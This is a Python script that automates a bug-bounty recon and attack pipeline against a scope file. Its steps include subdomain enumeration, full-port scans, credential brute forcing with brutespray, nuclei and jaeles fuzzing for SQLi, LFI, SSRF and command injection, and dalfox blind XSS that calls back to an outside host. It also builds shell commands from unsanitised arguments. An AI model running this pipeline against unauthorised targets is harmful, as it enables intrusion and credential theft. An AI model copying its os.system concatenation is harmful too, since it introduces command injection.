import argparse
import os
import concurrent.futures
import re
import subprocess

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('-o', help='output folder')
parser.add_argument('-m', help='file contain scope all *.example.com(medium)  and with this example.com(small)')
parser.add_argument('-cn', help='name of company on github')
parser.add_argument('-ct', help='dns canary token for testing ssrf and os (oob)')
parser.add_argument('-c', help='cookie')
args = parser.parse_args()

#make dir for output
os.system('mkdir ' + args.o)
os.system('mkdir ' + args.o + "/without_filtering")
#[+]---------------------------------   medium and small recon   ----------------------------------------[+]
scope_first = set(open(args.m).readlines())
scope_medium = set()
scope_small = set()
for i in scope_first:
    if '*' in i:
        scope_medium.add(i.replace('*.', '').strip())
    else:
        scope_small.add(i.strip())

                  #[+]-----------   passive and active subdomains enumeration   ------------[+]

def knockpy(sub):
    os.system("knockpy " + sub + " -w wordlist.txt --no-http -o " + args.o + "/without_filtering/")
def passive_active(nothing):
    os.system("./script " + args.m + " " + args.o)
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as e:
    nothing = [1]
    e.map(knockpy, scope_medium)
    e.map(passive_active, nothing)

#extract subdomains from knockpy output file to file contain all subdomains
#[+]----------------------------------------------------------------------------[+]
os.system("ls "+ args.o + "/without_filtering/>" + args.o + "/without_filtering/out")
out = open(args.o + "/without_filtering/out").readlines()
for i in out:
    os.system("knockpy --csv " + args.o + "/without_filtering/" + i.strip())
os.system("cat " + args.o + "/without_filtering/*.csv>" + args.o + "/without_filtering/all.csv")
all = open(args.o + "/without_filtering/all.csv").readlines()
subs = set()
for i in all:
    subdomain = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3};(.*);",i)
    subs.add(subdomain[0])
subs_file = open(args.o + "/without_filtering/subs", "a")
for sub in subs:
    subs_file.write(sub + "\n")

#[+]----------------------------------------------------------------------------[+]

# extract web subdomains using httpx for dirsearch
os.system("httpx -no-fallback -l " + args.o + "/recon/subdomains/live_subdomains -o " + args.o + "/recon/subdomains/dirsearch_subs")
#use httpx to extract unique live subdomains to enter it to scanners and wayback
os.system("httpx -l " + args.o + "/recon/subdomains/live_subdomains -o " + args.o + "/recon/subdomains/httpx_subs")

#[+]----------------------------------------------------------------------------[+]
# def function needed in next concurrent.futures
def dirsearch(sub):
    os.system("python3 webtool/dirsearch/dirsearch.py --full-url --random-agent -e 'php, asp, aspx, jsp, html, htm, js' -u " + sub)

def wappalyzer(sub):
    os.system("node webtool/technology/wappalyzer/src/drivers/npm/cli.js " + sub + " >> " + args.o + "/recon/technology/technologies.json")

def GitDorker(nothing):
    os.system("mkdir " + args.o + "/github_leaks")
    os.system("python3 webtool/GitDorker/GitDorker.py -org " + args.cn + " -d webtool/GitDorker/Dorks/alldorksv3 -ri -tf webtool/GitDorker/tokens -lb -o " + args.o + "/github_leaks/github_leaks")

def naabu(nothing):
    os.system("naabu -exclude-cdn -iL " + args.o + "/recon/subdomains/live_subdomains -p 1-65535 --rate 20000 -nmap-cli 'nmap -sV -oA " + args.o + "/network/nmap'")

def subover(nothing):
    os.system("SubOver -l " + args.o + "/recon/subdomains/live_subdomains -t 100 > " + args.o + "/subdomain_takeover/subover")

def wayback(nothing):
    os.system("cat " + args.o + "/recon/subdomains/httpx_subs |sed 's+http://++gi'|sed 's+https://++gi'|sort -u|gau >> " + args.o + "/recon/all_endpoints_and_gf/endpoints")
def clickjacking(nothing):
    os.system("mkdir " + args.o + "/other/clickjacking")
    os.system("python3 webtool/clickjack/clickjack.py -t 10 -i " + args.o + "/recon/subdomains/httpx_subs -o " + args.o + "/other/clickjacking/clickjacking_subs")
def smuggler(sub):
    os.system("python3 webtool/smuggler/smuggler.py -u " + sub + " -x -t 15")
def s3brute(sub):
    os.system("python webtool/s3brute/amazon-s3-enum.py -w webtool/s3brute/BucketNames.txt -d " + sub)
def getjs(nothing):
    os.system("mkdir " + args.o + "/js")
    os.system("mkdir " + args.o + "/js/js-files-content")
    os.system("cat "  + args.o + "/recon/subdomains/httpx_subs|subjs -t 30 >> " + args.o + "/js/js_files_links")
    os.system("wget -i " + args.o + "/js/js_files_links -P " + args.o + "/js/js-files-content/")

#start network scan and content discovery and some law hanging fruits
#[+]----------------------------------------------------------------------------[+]
os.system("mkdir " + args.o + "/network")
os.system("mkdir " + args.o + "/other")
os.system("mkdir " + args.o + "/other/smuggler")
os.system("mkdir " + args.o + "/other/s3-bucket")
os.system("mkdir " + args.o + "/other/dirsearch")
os.system("mkdir " + args.o + "/subdomain_takeover")
os.system("mkdir " + args.o + "/recon/technology")
os.system("mkdir " + args.o + "/recon/all_endpoints_and_gf")
os.system("mkdir " + args.o + "/recon/all_endpoints_and_gf")
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as e:
    scope_dirsearch = set()
    for i in open(args.o + "/recon/subdomains/dirsearch_subs"):
        scope_dirsearch.add(i.strip())
    scope_wappalyzer = set()
    for i in open(args.o + "/recon/subdomains/httpx_subs"):
        scope_wappalyzer.add(i.strip())
    scope_s3brute = set()
    for i in open(args.o + "/recon/subdomains/httpx_subs"):
        i = i.replace("https://", "")
        i = i.replace("http://", "")
        scope_s3brute.add(i.strip())

    nothing = [1]
    e.map(naabu, nothing)
    e.map(subover, nothing)
    e.map(dirsearch, scope_dirsearch)
    e.map(wappalyzer, scope_wappalyzer)
    e.map(GitDorker, nothing)
    e.map(wayback, nothing)
    e.map(clickjacking, nothing)
    e.map(smuggler, scope_wappalyzer)
    e.map(getjs, nothing)
    e.map(s3brute, scope_s3brute)
#[+]----------------------------------------------------------------------------[+]
#get output from dirsearch folder and from smuggler folder
#smuggler output
for i in scope_wappalyzer:
    i = i.replace("://", "_")
    i = i.replace(".", "_")
    x = subprocess.check_output("ls webtool/smuggler/payloads/", stderr=subprocess.STDOUT, shell=True)
    find = re.findall(i + "(.*)\\\\n", str(x))
    try:
        os.system("mv webtool/smuggler/payloads/" + i + find[0] + " " + args.o + "/other/smuggler/")
    except:
        pass
#dirsearch output
for i in scope_wappalyzer:
    i = i.replace("http://", "")
    i = i.replace("https://", "")
    try:
        os.system("cat webtool/dirsearch-master/reports/*/* | grep " + i + "| sort -u >> " + args.o + "/other/dirsearch/dirsearch")
    except:
        pass
# functions needed in next concurrent.futures
def brutespray(nothing):
    os.system("python3 webtool/brutespray/brutespray.py -f " + args.o + "/network/nmap.xml -o " + args.o + "/network/brutespray --threads 5 --hosts 5")

def nuclei_scan(nothing):
    os.system("nuclei -t ~/nuclei-templates/cves/ -l " + args.o + "/recon/subdomains/httpx_subs -c 50 -o " + args.o + "/nuclei/cves/cves")
    os.system("nuclei -t ~/nuclei-templates/exposed-panels/ -l " + args.o + "/recon/subdomains/httpx_subs -c 50 -o " + args.o + "/nuclei/exposed-panels/exposed-panels")
    os.system("nuclei -t ~/nuclei-templates/exposures/ -l " + args.o + "/recon/subdomains/httpx_subs -c 50 -o " + args.o + "/nuclei/exposures/exposures")
    os.system("nuclei -t ~/nuclei-templates/exposed-tokens/ -l " + args.o + "/recon/subdomains/httpx_subs -c 50 -o " + args.o + "/nuclei/exposed-tokens/exposed-tokens")
    os.system("nuclei -t ~/nuclei-templates/misconfiguration/ -l " + args.o + "/recon/subdomains/httpx_subs -c 50 -o " + args.o + "/nuclei/misconfiguration/misconfiguration")
    os.system("nuclei -t ~/nuclei-templates/network/ -l " + args.o + "/recon/subdomains/httpx_subs -c 50 -o " + args.o + "/nuclei/network/network")
    os.system("nuclei -t ~/nuclei-templates/vulnerabilities/ -l " + args.o + "/recon/subdomains/httpx_subs -c 50 -o " + args.o + "/nuclei/vulnerabilities/vulnerabilities")
    os.system("nuclei -t ~/nuclei-templates/miscellaneous/phpmyadmin-setup.yaml -tags misc -l " + args.o + "/recon/subdomains/httpx_subs -bs 50 -o " + args.o + "/nuclei/miscellaneous/miscellaneous")
    #cves need authentication so we will use cookie
    os.system("nuclei -t ~/nuclei-templates/cves/2018/CVE-2018-18069.yaml -H 'Cookie: " + args.c + "' -l " + args.o + "/recon/subdomains/httpx_subs -bs 50 -o " + args.o + "/nuclei/cves/CVE-2018-18069")
    os.system("nuclei -t ~/nuclei-templates/cves/2018/CVE-2018-1247.yaml -H 'Cookie: " + args.c + "' -l " + args.o + "/recon/subdomains/httpx_subs -bs 50 -o " + args.o + "/nuclei/cves/CVE-2018-1247")
    os.system("nuclei -t ~/nuclei-templates/cves/2019/CVE-2019-16097.yaml -H 'Cookie: " + args.c + "' -l " + args.o + "/recon/subdomains/httpx_subs -bs 50 -o " + args.o + "/nuclei/cves/CVE-2019-16097")
    os.system("nuclei -t ~/nuclei-templates/cves/2020/CVE-2020-17505.yaml -H 'Cookie: " + args.c + "' -l " + args.o + "/recon/subdomains/httpx_subs -bs 50 -o " + args.o + "/nuclei/cves/CVE-2020-17505")

def jaeles_scan(nothing):
    os.system("jaeles scan -c 50 -s ~/.jaeles/base-signatures/cves/ -U " + args.o + "/recon/subdomains/httpx_subs -o " + args.o + "/jaeles/cves")
    os.system("jaeles scan -c 50 -s ~/.jaeles/base-signatures/common/ -U " + args.o + "/recon/subdomains/httpx_subs -o " + args.o + "/jaeles/common")
    os.system("jaeles scan -c 50 -s ~/.jaeles/base-signatures/sensitive/ -U " + args.o + "/recon/subdomains/httpx_subs -o " + args.o + "/jaeles/sensitive")

def jaeles_fuzz(nothing):
    #os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/cors/cors-bypass.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/cors -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/common/CRLF.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/sqli/sql-error.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/sqli -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/sqli/sql-error-path.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/lfi/lfi-path-01.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/lfi/lfi-param-base.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/path_traversal -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/ssti/template-injection.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/ssti -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/common/ssrf.yaml -p 'dest=" + args.ct + "' -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/ssrf -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/common/OS_command_injection.yaml -p 'ssrf=" + args.ct + "' -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/rce -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/random/common-error.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/open-redirect/open-redirect-lite.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/open-redirect/open-redirect-param-base.yaml -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/redirect -o " + args.o + "/jaeles/fuzz")
    os.system("jaeles scan -c 100 -s ~/.jaeles/base-signatures/fuzz/common/host-header-injection.yaml -p 'dest=test.com' -H 'Cookie: " + args.c + "' -U " + args.o + "/recon/subdomains/httpx_subs -o " + args.o + "/jaeles/fuzz")

def nuclei_fuzz(nothing):
    os.system("nuclei -t ~/nuclei-templates/vulnerabilities/generic/error-based-sql-injection.yaml -H 'Cookie: " + args.c + "' -tags fuzz -l " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/sqli -bs   50 -o " + args.o + "/nuclei/fuzz/error-based-sql-injection")
    os.system("nuclei -t ~/nuclei-templates/vulnerabilities/generic/crlf-injection.yaml -H 'Cookie: " + args.c + "' -l " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints -bs 50 -o " + args.o + "/nuclei/fuzz/crlf-injection")
    os.system("nuclei -t ~/nuclei-templates/vulnerabilities/generic/open-redirect.yaml -H 'Cookie: " + args.c + "' -l " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints -bs 50 -o " + args.o + "/nuclei/fuzz/open-redirect")
    os.system("nuclei -t ~/nuclei-templates/nuclei-templates/fuzzing/adminer-panel-fuzz.yaml -H 'Cookie: " + args.c + "' -tags fuzz -l " + args.o + "/recon/subdomains/httpx_subs -bs 50 -o " + args.o + "/nuclei/fuzz/adminer-panel-fuzz")
    os.system("nuclei -t ~/nuclei-templates/vulnerabilities/generic/top-xss-params-omar.yaml -H 'Cookie: " + args.c + "' -l " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints -bs 50 -o " + args.o + "/nuclei/fuzz/top-xss-params")
    os.system("nuclei -t ~/nuclei-templates/headless/postmessage-tracker.yaml -headless -H 'Cookie: " + args.c + "' -tags headless -l " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints -bs 100 -o " + args.o + "/nuclei/fuzz/postmessage-tracker")

def dalfox(nothing):
    os.system("mkdir " + args.o + "/other/Gxss-dalfox")
    os.system("cat " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/Gxss-dalfox |Gxss -c 100|qsreplace -a|tee -a " + args.o + "/other/Gxss-dalfox/Gxss")
    if args.c is not None:
        os.system("cat " + args.o + "/other/Gxss-dalfox/Gxss |qsreplace -a| dalfox pipe -b https://omar0x01.xss.ht -C " + args.c + " -o " + args.o + "/other/Gxss-dalfox/dalfox")
    else:
        os.system("cat " + args.o + "/other/Gxss-dalfox/Gxss |qsreplace -a| dalfox pipe -b https://omar0x01.xss.ht -o " + args.o + "/other/Gxss-dalfox/dalfox")

#[+]----------------------------------------------------------------------------[+]
#make needing directories and params
#gf
os.system("mkdir " + args.o + "/recon/all_endpoints_and_gf/gf_parameters")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/parms_endpoints")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a|gf sqli > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/sqli")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a|gf ssrf > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/ssrf")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a|gf ssti > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/ssti")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a|gf lfi > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/path_traversal")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a|gf img-traversal >> " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/path_traversal")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a|gf idor > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/idor")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a|gf debug_logic > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/logic")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a|gf rce > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/rce")
os.system("cat " + args.o + "/recon/subdomains/live_subdomains|grep = |qsreplace -a|gf interestingsubs > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/interesting_subs")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|grep = |qsreplace -a|gf redirect > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/redirect")
os.system("cat " + args.o + "/recon/all_endpoints_and_gf/endpoints|egrep -iv '\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)'|grep = |qsreplace -a > " + args.o + "/recon/all_endpoints_and_gf/gf_parameters/Gxss-dalfox")

#make directories for nuclei
os.system("mkdir " + args.o + "/nuclei")
os.system("mkdir " + args.o + "/nuclei/cves")
os.system("mkdir " + args.o + "/nuclei/exposed-panels")
os.system("mkdir " + args.o + "/nuclei/exposed-tokens")
os.system("mkdir " + args.o + "/nuclei/exposures")
os.system("mkdir " + args.o + "/nuclei/vulnerabilities")
os.system("mkdir " + args.o + "/nuclei/network")
os.system("mkdir " + args.o + "/nuclei/misconfiguration")
os.system("mkdir " + args.o + "/nuclei/miscellaneous")
os.system("mkdir " + args.o + "/nuclei/fuzz")
os.system("mkdir " + args.o + "/nuclei/headless")
#make directories for jaeles
os.system("mkdir " + args.o + "/jaeles")
os.system("mkdir " + args.o + "/jaeles/common")
os.system("mkdir " + args.o + "/jaeles/cves")
os.system("mkdir " + args.o + "/jaeles/sensitive")
os.system("mkdir " + args.o + "/jaeles/fuzz")
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as e:
    # start brutespray
    nothing = [1]
    os.system("nuclei -ut")
    e.map(brutespray, nothing)
    e.map(nuclei_scan, nothing)
    e.map(jaeles_scan, nothing)
    e.map(jaeles_fuzz, nothing)
    e.map(nuclei_fuzz, nothing)
    e.map(dalfox, nothing)

